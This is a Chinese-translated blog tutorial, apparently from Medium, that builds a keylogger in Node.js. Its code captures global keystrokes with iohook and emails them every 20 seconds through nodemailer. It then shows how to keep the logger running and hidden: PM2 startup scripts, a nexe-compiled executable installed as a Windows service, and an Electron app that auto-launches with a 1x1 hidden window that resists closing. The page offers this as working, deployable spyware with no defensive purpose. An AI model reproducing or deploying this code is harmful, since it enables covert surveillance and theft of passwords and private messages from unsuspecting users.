<html>
<head>
<title>KeyLogger in JavaScript</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">JavaScript中的键盘记录器</h1>
<blockquote>原文：<a href="https://blog.devgenius.io/keylogger-in-javascript-e77b78cd7219?source=collection_archive---------5-----------------------#2022-01-01">https://blog.devgenius.io/keylogger-in-javascript-e77b78cd7219?source=collection_archive---------5-----------------------#2022-01-01</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="b9fc" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">是的，有可能。</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/89cd7d604db47f113d794b153636308f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*1NVqBa4lDxXT2EEB"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">由<a class="ae kv" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上的<a class="ae kv" href="https://unsplash.com/@krisroller?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank">克里斯托佛罗拉</a>拍摄的照片</figcaption></figure><p id="9b5a" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">对于核心实现，我需要两个主要的外部库:<a class="ae kv" href="https://wilix-team.github.io/iohook/" rel="noopener ugc nofollow" target="_blank"> IoHook </a>和<a class="ae kv" href="https://nodemailer.com/about/" rel="noopener ugc nofollow" target="_blank"> NodeMailer </a>。</p><pre class="kg kh ki kj gt ls lt lu lv aw lw bi"><span id="7fe5" class="lx ly iq lt b gy lz ma l mb mc">"dependencies": {<br/>  "<strong class="lt ir">iohook</strong>": "^0.9.3",<br/>  "<strong class="lt ir">nodemailer</strong>": "^6.7.2"<br/>}</span></pre><p id="b80a" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi md translated">第一步是在<em class="mm"> keyDown </em>事件上启动IoHook监听器，从自定义输入映射中读取实际字符。事实上，不幸的是，事件返回的按键代码与特殊字符的实际代码并不对应，所以我们不能使用<em class="mm"> String.fromCharCode()。</em></p><pre class="kg kh ki kj gt ls lt lu lv aw lw bi"><span id="2560" class="lx ly iq lt b gy lz ma l mb mc">const <strong class="lt ir">ioHook </strong>= require('iohook');</span><span id="a8bb" class="lx ly iq lt b gy mn ma l mb mc">const <strong class="lt ir">keyNamesWin </strong>= { // ... <br/>  52: '.',<br/>  53: 'ù',<br/>  54: 'Shift' //.... }</span><span id="b413" class="lx ly iq lt b gy mn ma l mb mc">let <strong class="lt ir">cache </strong>= []</span><span id="09f7" class="lx ly iq lt b gy mn ma l mb mc"><strong class="lt ir">ioHook</strong>.on('keydown', (event) =&gt; {<br/>    <strong class="lt ir">cache</strong>.push(<strong class="lt ir">keyNamesWin</strong>[event.keycode])<br/>});</span></pre><p id="4662" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi md translated">第二步是实际配置NodeMailer SMTP帐户。在这种情况下，我使用的是一个假的<a class="ae kv" href="https://mailtrap.io/" rel="noopener ugc nofollow" target="_blank"> MailTrap.io </a>账户。</p><pre class="kg kh ki kj gt ls lt lu lv aw lw bi"><span id="b43a" class="lx ly iq lt b gy lz ma l mb mc">const <strong class="lt ir">nodemailer </strong>= require('nodemailer');<br/>const <strong class="lt ir">transport </strong>= <strong class="lt ir">nodemailer</strong>.createTransport({<br/>    <strong class="lt ir">host</strong>: "smtp.mailtrap.io",<br/>    <strong class="lt ir">port</strong>: 2525,<br/>    <strong class="lt ir">auth</strong>: {<br/>        user: "xxxx",<br/>        pass: "xxxx"<br/>    }<br/>});</span></pre><p id="b093" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi md translated"><span class="l me mf mg bm mh mi mj mk ml di"> T </span>第三步是使用<a class="ae kv" href="https://developer.mozilla.org/en-US/docs/Glossary/IIFE" rel="noopener ugc nofollow" target="_blank">生命函数</a>来启用保存在<strong class="ky ir">缓存</strong>变量中的定时器，该定时器实际上发送保存在按键下的邮件。</p><pre class="kg kh ki kj gt ls lt lu lv aw lw bi"><span id="6932" class="lx ly iq lt b gy lz ma l mb mc">(function timer() {<br/>    if (cache.length &gt; 0) {<br/>        mailOptions.text = cache.toString()<br/>        <strong class="lt ir"><em class="mm">console</em></strong>.log('mail')<br/>        transport.sendMail(mailOptions, (error, info) =&gt; {<br/>            if (error) {<br/>                return <strong class="lt ir"><em class="mm">console</em></strong>.log(error);<br/>            }<br/>            <strong class="lt ir"><em class="mm">console</em></strong>.log('Message sent: %s', info.messageId);<br/>        });<br/>        cache = [];<br/>    } else {<br/>        <strong class="lt ir"><em class="mm">console</em></strong>.log('empty')<br/>    }<br/>    setTimeout(timer, 20000);<br/>})();</span></pre></div><div class="ab cl mo mp hu mq" role="separator"><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt"/></div><div class="ij ik il im in"><p id="5b35" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">关于程序的实际执行，有两种主要场景:在节点。JS运行时已安装并可用，以及节点的位置。JS未安装。</p><p id="9434" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi md translated"><span class="l me mf mg bm mh mi mj mk ml di"> F </span>或者第一种情况<strong class="ky ir"> (NodeJS===true) </strong>，我们可以简单地使用Node.JS的<a class="ae kv" href="https://pm2.keymetrics.io/" rel="noopener ugc nofollow" target="_blank"> PM2 </a>进程管理器来执行脚本</p><pre class="kg kh ki kj gt ls lt lu lv aw lw bi"><span id="ddee" class="lx ly iq lt b gy lz ma l mb mc">&gt; npm install -g pm2 <br/>&gt; pm2 start index.js</span></pre><p id="e854" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">也可以启用一个<a class="ae kv" href="https://pm2.keymetrics.io/docs/usage/startup/" rel="noopener ugc nofollow" target="_blank"> PM2启动脚本</a>，让它在系统重启时启动。(对于windows机器来说稍微复杂一些，但无论如何都是可行的)。</p><p id="cad1" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi md translated"><span class="l me mf mg bm mh mi mj mk ml di"> F </span>或者第二种情况<strong class="ky ir"> (NodeJS===false) </strong>，一种解决方案是使用<a class="ae kv" href="https://github.com/nexe/nexe" rel="noopener ugc nofollow" target="_blank"> Nexe </a>将Node.js应用程序编译成单个可执行文件。您需要从列表中为可执行文件选择一个合适的运行时。您可能希望将该可执行文件作为服务安装。对于windows，可以使用令人敬畏的<a class="ae kv" href="http://nssm.cc/" rel="noopener ugc nofollow" target="_blank"> NSSM </a>。</p><pre class="kg kh ki kj gt ls lt lu lv aw lw bi"><span id="21ae" class="lx ly iq lt b gy lz ma l mb mc">&gt; npm install -g nexe<br/>&gt; nexe index.js -o test -t windows --build --verbose</span></pre><p id="c555" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><em class="mm">(注意:第一次构建需要一段时间。对于windows，它可能会要求您安装</em><a class="ae kv" href="https://www.nasm.us/pub/nasm/releasebuilds/2.15.04/win64/" rel="noopener ugc nofollow" target="_blank"><em class="mm">NASM</em></a><em class="mm">也。)</em></p><p id="2f7d" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">Windows操作系统的另一个解决方案可能是构建一个<a class="ae kv" href="https://www.electronjs.org/" rel="noopener ugc nofollow" target="_blank">电子。JS </a>可以最小化启动并自动配置为在启动时启动的应用程序。</p><pre class="kg kh ki kj gt ls lt lu lv aw lw bi"><span id="6c03" class="lx ly iq lt b gy lz ma l mb mc">const AutoLaunch = require('auto-launch');<br/>const nodemailer = require('./node_modules/nodemailer')<br/>const ioHook = require('./node_modules/iohook')</span><span id="07ed" class="lx ly iq lt b gy mn ma l mb mc">function <strong class="lt ir">init</strong>() { <br/>  // here we have the exact same code for the keylogger provided above. <br/>} </span><span id="fa90" class="lx ly iq lt b gy mn ma l mb mc">let tray = null<br/><br/>function <strong class="lt ir">createWindow </strong>() {<br/>  let autoLaunch = new AutoLaunch({<br/>    name: 'Your app name goes here',<br/>    path: app.getPath('exe'),<br/>  });<br/>  autoLaunch.isEnabled().then((isEnabled) =&gt; {<br/>    if (!isEnabled) autoLaunch.enable();<br/>  });</span><span id="5150" class="lx ly iq lt b gy mn ma l mb mc">  const mainWindow = new BrowserWindow({<br/>    width: 1,<br/>    height: 1,<br/>    frame: false,<br/>    webPreferences: {<br/>      nodeIntegration: true,<br/>      enableRemoteModule: true<br/>    }<br/>  });</span><span id="da04" class="lx ly iq lt b gy mn ma l mb mc">  tray = new Tray('icon.png')<br/>  tray.setToolTip('This is my application.')<br/>  tray.setContextMenu(Menu.buildFromTemplate([<br/>    {label: 'Disable', type: 'radio'}<br/>  ]))<br/>  mainWindow.loadFile('index.html')<br/>  mainWindow.on('minimize', function (event) {<br/>    event.preventDefault();<br/>    mainWindow.hide();<br/>  });<br/>  mainWindow.on('close', function (event) {<br/>    if (!application.isQuiting) {<br/>      mainWindow.minimize();<br/>    }<br/>    return false;<br/>  });<br/>  mainWindow.minimize()<br/>  init();<br/>}<br/>app.whenReady().then(() =&gt; {<br/>  createWindow()<br/>  app.on('activate', function () {<br/>    if (BrowserWindow.getAllWindows().length === 0) createWindow()<br/>  })<br/>})</span></pre><p id="bf33" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在这种情况下，需要在根级别的package.json中定义IoHook库的目标。</p><pre class="kg kh ki kj gt ls lt lu lv aw lw bi"><span id="caba" class="lx ly iq lt b gy lz ma l mb mc">"iohook": {<br/>  "targets": [<br/>    "node-83", // this is the node ABI<br/>    "electron-87" // this is the electron ABI <br/>  ],<br/>  "platforms": [<br/>    "win32",<br/>    "darwin",<br/>    "linux"<br/>  ],<br/>  "arches": [<br/>    "x64",<br/>    "ia32"<br/>  ]<br/>},</span></pre><p id="849f" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">最后，<a class="ae kv" href="https://www.electron.build/" rel="noopener ugc nofollow" target="_blank">electronic-builder</a>将提供这个电子应用程序的安装程序，它将作为一个托盘图标最小化。</p></div></div>    
</body>
</html>